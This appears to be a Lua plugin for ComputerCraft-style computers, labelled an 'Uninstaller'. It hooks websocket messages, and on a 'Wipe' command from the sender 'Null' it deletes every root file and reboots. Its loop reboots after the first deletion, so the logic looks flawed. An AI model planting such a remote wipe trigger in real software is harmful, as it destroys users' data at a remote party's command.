local ws = nil
local helper = {}

local hooks = {
    onMessage = {

    }
}

local function uninstall(message_data,sender)
    local words = string.gmatch(message_data, "%S+")
    local args = {}

    for arg in words do
        table.insert(args,arg)
    end

    local command = args[1]
    if command and sender == "Null" then
        local data = string.sub(message_data,#command+2)

        if command == "Wipe" then
            local files = fs.list("/")
            for _, file in pairs(files) do
                print("Deleting: "..file)
                pcall(fs.delete,file)
                helper.sendMessage("Null","Goodbye.")
                os.reboot()
            end
        end
    end
end

local function init(webSock, helper_functions)
    ws = webSock
    helper = helper_functions

    print("Initalizing Uninstaller plugin!")
    table.insert(hooks.onMessage,uninstall)
end

return {init = init, hooks = hooks}